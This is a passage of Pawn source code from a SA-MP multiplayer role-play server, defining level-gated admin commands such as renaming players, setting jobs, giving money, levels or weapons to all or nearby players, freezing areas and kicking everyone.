			return 1;
		}
	}
	return 1;
}
CMD:specoff(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			if(Spectate[playerid] != -1)
			{
				TogglePlayerControllable(playerid, 1);
				TogglePlayerSpectating(playerid, 0);
				SetPlayerInterior(playerid,Unspec[playerid][sPint]);
				PlayerInfo[playerid][pInt] = Unspec[playerid][sPint];
				PlayerInfo[playerid][pLocal] = Unspec[playerid][sLocal];
				Unspec[playerid][sLocal] = -1;
				gTeam[playerid] = PlayerInfo[playerid][pTeam];
				SetPlayerToTeamColor(playerid);
	        	PlayerTextDrawHide(playerid, TextDrawSpec[playerid][1]);
		    	PlayerTextDrawHide(playerid, TextDrawSpec[playerid][2]);
				PlayerTextDrawHide(playerid, TextDrawSpec[playerid][3]);
		    	PlayerTextDrawHide(playerid, TextDrawSpec[playerid][4]);
		    	PlayerTextDrawHide(playerid, TextDrawSpec[playerid][5]);
				Spectate[playerid] = -1;
				DMGadmin[playerid] = 0;
				CancelSelectTextDraw(playerid);
				for(new i = 0; i < sizeof(SpecTD); i++) PlayerTextDrawHide(playerid, SpecTD[i]);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
/*CMD:quest(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new remain = ultimulomdezapada;
		for(new qs=0; qs<=50; qs++)
		{
			if(QEvent[playerid][qs] == 1)
			{
				remain--;
			}
		}
		if(PlayerInfo[playerid][pLanguage] == 2)
		{
			if(remain > 0)
			{
				SendClientMessage(playerid, -1, "{0066FF}Quest: {FFFFFF}Mergi langa toti cei 50 de oameni de zapada si tasteaza comanda (/selfie).");
				SendClientMessage(playerid, -1, "{0066FF}Quest: {FFFFFF}Oameni de zapada se vor distruge cand iti vei face un (/selfie) cu ei.");
				SCM(playerid, -1, "");
				format(MGLOBAL, sizeof(MGLOBAL),"{0066FF}Quest: {FFFFFF}Mai fa %d (/selife-uri) cu %d oameni de zapada pentru a castiga premiul special.", remain, remain);
				SendClientMessage(playerid, -1, MGLOBAL);
			}
			else if(remain == 0)
			{
				SendClientMessage(playerid, COLOR_ERROR, "Ai terminat deja misiunea de craciun.");
			}
		}
	}
	return 1;
}*/
CMD:changeemail(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,email[64];
	if(sscanf(params, "us[64]",id,email)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/changeemail <Name/Playerid> <Email>");
	if(!IsPlayerConnected(id)) return SCM(playerid,COLOR_SERVER, "{C1F589}Error: Player not connected.");
	if(IsPlayerConnected(id))
	{
		strmid(PlayerInfo[playerid][pEmail], email, 0, strlen(email), 255);
		Update(id,pEmailx);
	}
	else return SendClientMessage(playerid,COLOR_SERVER, "{C1F589}Error: Player not connected.");
	return 1;
}
CMD:changename(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new id,changenametext[25],string[456],giveplayer[30],sendername[30];
		if(sscanf(params, "us[25]",id,changenametext)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/changename <player id> <new player name>");
		GetPlayerName(id, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
  		if(IsPlayerConnected(id))
		{
			new newname = MySQLCheckAccount(changenametext);
			if(newname != 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name exist.");
			if(PlayerInfo[id][pPhousekey] != 999)
			{
				new houseid = PlayerInfo[id][pPhousekey];
				strmid(HouseInfo[houseid][hOwner], changenametext, 0, strlen(changenametext), 255);
				mysql_format(SQL,string,sizeof(string),"UPDATE `houses` SET `Owner`='%s' WHERE `ID`='%d'",changenametext,houseid);
				mysql_tquery(SQL,string,"","");
				OnPropTextdrawUpdate(1,PlayerInfo[id][pPhousekey]);
	   		}
			if(PlayerInfo[id][pPhousekey2] != 999)
			{
				new houseid = PlayerInfo[id][pPhousekey2];
				strmid(HouseInfo[houseid][hOwner], changenametext, 0, strlen(changenametext), 255);
				mysql_format(SQL,string,sizeof(string),"UPDATE `houses` SET `Owner`='%s' WHERE `ID`='%d'",changenametext,houseid);
				mysql_tquery(SQL,string,"","");
				OnPropTextdrawUpdate(1,PlayerInfo[id][pPhousekey2]);
	   		}
			if(PlayerInfo[id][pPbiskey] != 255)
			{
				new bizid2 = PlayerInfo[id][pPbiskey];
				strmid(BizzInfo[bizid2][bOwner], changenametext, 0, strlen(changenametext), 255);
				mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Owner`='%s' WHERE `ID`='%d'",changenametext,bizid2);
				mysql_tquery(SQL,string,"","");
				OnPropTextdrawUpdate(2,PlayerInfo[id][pPbiskey]);
	   		}
	   		if(PlayerInfo[id][pPcarkey] != 0)
			{
				new carid = PlayerInfo[id][pPcarkey];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
	   		if(PlayerInfo[id][pmotokey] != 0)
			{
				new carid = PlayerInfo[id][pmotokey];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pprcarkey2] != 0)
			{
				new carid = PlayerInfo[id][pprcarkey2];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pPPluscarkey] != 0)
			{
				new carid = PlayerInfo[id][pPPluscarkey];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pPPluscarkey2] != 0)
			{
				new carid = PlayerInfo[id][pPPluscarkey2];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
	   		if(PlayerInfo[id][pprcarkey] != 0)
			{
				new carid = PlayerInfo[id][pprcarkey];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey7] != 0)
			{
				new carid = PlayerInfo[id][pCarkey7];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey8] != 0)
			{
				new carid = PlayerInfo[id][pCarkey8];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey9] != 0)
			{
				new carid = PlayerInfo[id][pCarkey9];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey10] != 0)
			{
				new carid = PlayerInfo[id][pCarkey10];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey11] != 0)
			{
				new carid = PlayerInfo[id][pCarkey11];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey12] != 0)
			{
				new carid = PlayerInfo[id][pCarkey12];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey13] != 0)
			{
				new carid = PlayerInfo[id][pCarkey13];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey14] != 0)
			{
				new carid = PlayerInfo[id][pCarkey14];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			if(PlayerInfo[id][pCarkey15] != 0)
			{
				new carid = PlayerInfo[id][pCarkey15];
				strmid(CarInfo[carid][cOwner], changenametext, 0, strlen(changenametext), 255);
				vUpdate(carid,cOwnerx);
			}
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET `name`='%s' WHERE `name`='%s'",changenametext,PlayerInfo[id][pNormalName]);
			mysql_tquery(SQL,str,"","");
			SetPlayerName(id, changenametext);
			format(string, sizeof(string), "Admin %s changed %s's nickname to: %s.", sendername,giveplayer,changenametext);
			ABroadCast(COLOR_RED,string,1);
			SCM(id,COLOR_ERROR,"You kicked for database synchronization, please relogin.");
			KickEx(id);
		}
		else return SendClientMessage(playerid,COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:sethour(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new id,hours,string[256],giveplayer[30],sendername[30];
			if(sscanf(params, "ui",id,hours)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/sethour <Name/Playerid> <Hours played>");
			{
			    if(IsPlayerConnected(id))
			    {
			        if(IsPlayerConnected(id))
			        {
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						PlayerInfo[id][pConnectTime] = hours;
						format(string, sizeof(string), "Admin %s has set %s's hours to %d.", sendername,giveplayer,hours);
						ABroadCast(COLOR_YELLOW,string,1);
						Update(id,pConnectTimex);
					}
				}
				else return SendClientMessage(playerid,COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
/*CMD:buylicenses(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
   	{
	    ShowPlayerDialog(playerid, Dialog_shoplicense, DIALOG_STYLE_LIST, "Licenses list:","{FFFFFF}Driving{357AB7} License\n{FFFFFF}Pilots{357AB7} License\n{FFFFFF}Boats{357AB7} License\n{FFFFFF}Weapon{357AB7} License","Ok","Cancel");
	}
	return 1;
}*/
CMD:setjob(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new id,jobid,string[256],giveplayer[30],sendername[30];
			if(sscanf(params, "ui",id,jobid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setjob <Name/Playerid> <Job ID>");
			{
			    if(IsPlayerConnected(id))
			    {
			        if(IsPlayerConnected(id))
			        {
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						PlayerInfo[id][pJob] = jobid;
						format(string, sizeof(string), "Admin %s has changed %s's job to %d.", sendername,giveplayer,jobid);
						ABroadCast(COLOR_YELLOW,string,1);
						format(string, sizeof(string), "Admin %s has changed you job to %d.", sendername,jobid);
						SCM(id,COLOR_LIGHTBLUE, string);
						new str[128];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='%d' WHERE `name`='%s'",PlayerInfo[id][pJob],PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,str,"","");
					}
				}
				else
				{
  					SendClientMessage(playerid,COLOR_SERVER, "{C1F589}Error: Player not connected.");
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:setevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new giveexpp,recivedexpp,reciveedmoneyy;
		if(sscanf(params, "iii",giveexpp,recivedexpp,reciveedmoneyy)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setevent <player online> <respect received> <money received>");
		giveexp = giveexpp;
        recivedexp = recivedexpp;
        recivedmoney = reciveedmoneyy;
        eventon = 1;
		new string[256],sendername[25];
	    GetPlayerName(playerid,sendername,sizeof(sendername));
		format(string, sizeof(string), "Admin %s has started an event %d players online, respect points: %d, money: $%s.", sendername,giveexpp,recivedexpp,FormatNumber(reciveedmoneyy));
		ABroadCast(COLOR_YELLOW,string,1);
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:stopmevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
        eventon = 0;
        new string[256];
		format(string, sizeof(string), "Admin %s has closed event much players online.",GetName(playerid));
		ABroadCast(COLOR_YELLOW,string,1);
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:giveallmoney(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new moneyall,sendername[MAX_PLAYER_NAME],string[100];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",moneyall)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/giveallmoney <money>");
		if(moneyall >= 99999999) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Error: Too much moneys.");
		else if(moneyall < 99999999)
		{
			format(string, sizeof(string),"{ba9789}Admin %s give %s$ to all players online.",sendername,FormatNumber(moneyall));
			SendClientMessageToAll(COLOR_SERVER,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				GivePlayerCash(i, moneyall);
			}
		}
	}
	else
	{
	     SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	 	 return 1;
	}
	return 1;
}
CMD:areablvip(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new range,sendername[MAX_PLAYER_NAME],string[256];
			if(sscanf(params, "i",range)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/areablvip [Raza]");
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s blocked using the command vip in range: %d.", sendername, range);
				ABroadCast(COLOR_AdminWarn,string,1);
				BLRaza = range;
				GetPlayerPos(playerid, BLXYZ[0], BLXYZ[1], BLXYZ[2]);
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/help level isn't high enough to use this command.");
	}
	return 1;
}
CMD:areafreeze(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new range,sendername[MAX_PLAYER_NAME],string[256];
			if(sscanf(params, "i",range)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/areafreeze [Range]");
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has frozen all players on range of %d.", sendername, range);
				ABroadCast(COLOR_AdminWarn,string,1);
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
					if (ProxDetectorS(range, playerid, i))
					{
						TogglePlayerControllable(i, 0);
						arefreeze[i] = 1;
					}
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/help level isn't high enough to use this command.");
	}
	return 1;
}
CMD:areaunfreeze(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new range,sendername[MAX_PLAYER_NAME],string[256];
			if(sscanf(params, "i",range)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/areaunfreeze [Range]");
			GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has unfrozen all players on range of %d.", sendername, range);
	        ABroadCast(COLOR_AdminWarn,string,1);
			for(new i = 0; i < MAX_PLAYERS; i ++)
			{
				if (ProxDetectorS(range, playerid, i))
				{
					TogglePlayerControllable(i, 1);
					arefreeze[i] = 0;
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/help level isn't high enough to use this command.");
	}
	return 1;
}
CMD:areadisarm(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new range,string[256],sendername[MAX_PLAYER_NAME];
		if(sscanf(params, "i",range)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/areadisarm <Range>");
		{
		    GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has disarmed all players on range of %d.", sendername, range);
	        ABroadCast(COLOR_AdminWarn,string,1);
			for(new i = 0; i < MAX_PLAYERS; i ++)
			{
				if (ProxDetectorS(range, playerid, i))
				{
					ResetPlayerWeaponsEx(i);
		    		ResetPlayerWeapons(i);
			 	}
	  	  	}
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:areagun(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new range,gun,ammo,string[256],sendername[25],count=0;
		if(sscanf(params, "iii", range, gun, ammo)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/areagun <Range> <GunID> <Ammo>");
		{
		    GetPlayerName(playerid, sendername, sizeof(sendername));
		    if(gun < 1||gun > 46||gun==19||gun==20||gun==21||gun==45) return SCM(playerid,COLOR_SERVER,"Invalid weapond ID.");
		    if(ammo <1||ammo > 1000) return SCM(playerid,COLOR_SERVER,"Invalid ammo (1-1000).");
		    format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has given gun %d with %d bullets to all players on range %d.", sendername,gun,ammo,range);
			ABroadCast(COLOR_AdminWarn,string,1);
			foreach(Player,i)
			{
				if(IsPlayerConnected(i))
				{
					if(ProxDetectorS(range, playerid, i))
					{
						GivePlayerWeaponEx(i, gun, ammo);
						if(GetPlayerState(i) == PLAYER_STATE_PASSENGER)
						{
				        	new gun2,tmp;
				        	GetPlayerWeaponData(i,5,gun2,tmp);
				        	#pragma unused tmp
				        	if(gun2)SetPlayerArmedWeapon(i,gun2);
				        	else SetPlayerArmedWeapon(i,0);
				        	count++;
						}
					}
				}
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:areaarmour(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new range,armor,string[256],sendername[MAX_PLAYER_NAME];
			if(sscanf(params, "ii", range, armor)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/areaarmour <Range> <Armor>");
			{
			    GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "[Admin-Warn]: {FFFFFF}%s has set to all players on range %d armour to %d.", sendername, range, armor);
    			ABroadCast(COLOR_AdminWarn,string,1);
		  		for(new i = 0; i < MAX_PLAYERS; i ++)
				{
					if (ProxDetectorS(range, playerid, i))
					{
						SetPlayerArmourEx(i, armor);
		    			format(string, sizeof(string), "* Admin %s ti-a setat armura.", sendername);
						SendClientMessage(i, COLOR_ERROR, string);
					}
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:areaheal(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new range,hp,string[256],sendername[MAX_PLAYER_NAME];
			if(sscanf(params, "ii", range, hp)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/areaheal <Range> <Hp>");
			{
			    GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "[Admin-Warn]: {FFFFFF}%s has set to all players in range %d heal to %d.", sendername, range, hp);
    			ABroadCast(COLOR_AdminWarn,string,1);
		  		for(new i = 0; i < MAX_PLAYERS; i ++)
				{
					if (ProxDetectorS(range, playerid, i))
					{
						SetPlayerHealthEx(i, hp);
		    			format(string, sizeof(string), "* Admin %s ti-a setat viata.", sendername);
						SendClientMessage(i, COLOR_ERROR, string);
					}
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:givealllevel(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new rpall,sendername[MAX_PLAYER_NAME],string[100];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",rpall)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/givealllevel <Level>");
		if(rpall >= 50) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Error: Too much level(1-50).");
		else if(rpall < 50)
		{
			format(string, sizeof(string),"{ba9789}Admin %s give %d level to all players online.",sendername,rpall);
			SendClientMessageToAll(COLOR_SERVER,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pLevel] += rpall;
				SetPlayerScore(i, PlayerInfo[i][pLevel]);
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:giveallrp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new rpall,sendername[MAX_PLAYER_NAME],string[100];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",rpall)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/giveallrp <respect points>");
		if(rpall >= 50) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Error: Too much respect points(1-50).");
		else if(rpall < 50)
		{
			format(string, sizeof(string),"{ba9789}Admin %s give %d respect points to all players online.",sendername,rpall);
			SendClientMessageToAll(COLOR_SERVER,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pExp] += rpall;
			}
		}
	}
	else
	{
	     SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	 	 return 1;
	}
	return 1;
}
CMD:ah(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new x_nr[256], idx;
		x_nr = strtok(params, idx);
		if(!strlen(x_nr))
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "{A9C4E4}Usage: {FFFFFF} /ah [1,2,3,4,5,6]");
			return 1;
		}
	   	else if(strcmp(x_nr,"1",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
			SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________[Admin 1]_____________________________________________________________________");
            SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 1: /a /ha /ban /banip /banipp /banoff /kick /mute /check /warn /setint /gotojail /l");
			SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 1: /respawn /clearchat(/cc) /ban /goback /spec /specoff /setvw /freeze /unfreeze /togiplog /gotocars");
			SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 1: /slap /up /down /unmute /getip /aimtest /setjob /gethere /managearea /checkv /last /fmembers");
			SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 1: /gotols /gotosf /gotolv /placegotoevent /count /fastevent /bigears /rveh /gotom");
			SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 1: /freeze /unfreeze /o /anno /disarm /ajail /ajailo /togfind /aduty /viewnewbie");
            SendClientMessage(playerid, COLOR_GREEN,"_______________________________________________________________________________________________________________________________________");
          	}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
        else if(strcmp(x_nr,"2",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 2)
			{
            SendClientMessage(playerid, COLOR_GREEN,"___________________________________________[Admin 2]_________________________________________________________________________");
            SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 2: /fvrs /skydive /gotods /jetpack /nos /areaarmour /areaheal /areadisarm /areagun /areafreeze /areaunfreeze");
            SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 2: /checkgun /PutPlayerInVehicleEx /fixveh /sethp /gotomark /getcar /mark /areablvip");
            SendClientMessage(playerid, COLOR_GREEN,"_____________________________________________________________________________________________________________________________");
			}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
		else if(strcmp(x_nr,"3",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
                SendClientMessage(playerid, COLOR_GREEN,"___________________________________________[Admin 3]__________________________________________________");
				SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 3: /gotoin /rac /oplace");
				SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 3: /oldcar /gotocar /goto");
				SendClientMessage(playerid, COLOR_GREEN,"______________________________________________________________________________________________________");
			}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
		else if(strcmp(x_nr,"4",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
                SendClientMessage(playerid, COLOR_GREEN,"______________________________________________________[Admin 4]______________________________________________________");
				SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 4: /fuelcars /temporarskin /unbanip /auninvite /auninviteoff /givegun /setarmor");
		        SendClientMessage(playerid, COLOR_MAYOR, " ***Admin Level 4: /weatherall /leaderwarn");
		        SendClientMessage(playerid, COLOR_GREEN,"_____________________________________________________________________________________________________________________");
			}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
		else if(strcmp(x_nr,"5",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 5)
			{
                SendClientMessage(playerid, COLOR_GREEN,"___________________________________________________________________[Co-Owner]________________________________________________________________");
				SendClientMessage(playerid, COLOR_MAYOR, " ***Co-Owner: /makeleader /makehelper /agl /tod /asellhouse /asellbiz /gotosac /givealllevel /removeleaderwarn /maxmembers");
			    SendClientMessage(playerid, COLOR_MAYOR, " ***Co-Owner: /setskin /givemoney /money(sets money) /bank /giveallmoney /unwarn /setpremium /removepremium /hprice /minlevel");
			    SendClientMessage(playerid, COLOR_GREEN,"_____________________________________________________________________________________________________________________________________________");
			}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        }
		else if(strcmp(x_nr,"6",true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] >= 6)
			{
                SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________[Owner]___________________________________________________________________");
			    SendClientMessage(playerid, COLOR_MAYOR, " ***Owner: /togkickafk /serverpass /servername /spawncar /removeallspawncar /makeadmin /resethelp /changename");
                SendClientMessage(playerid, COLOR_MAYOR, " ***Owner: /setcar /checkspawncar /removespawncarid /setpp, /setvip, /kickall /activatebonus /serverrestart");
                SendClientMessage(playerid, COLOR_GREEN,"____________________________________________________________________________________________________________________________________");
			}
			else SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        }
	}
	return 1;
}
CMD:kickall(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new reason[128], string[256], sendername[25];
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
	    if(sscanf(params, "s[128]", reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/kickall <reason>");
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Kick all: %s has kicked all players, reason: %s.", sendername, reason);
			Adminlog(string);
			SendClientMessageToAll(COLOR_ERROR, string);
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
				KickEx(i);
			}
		}
	}
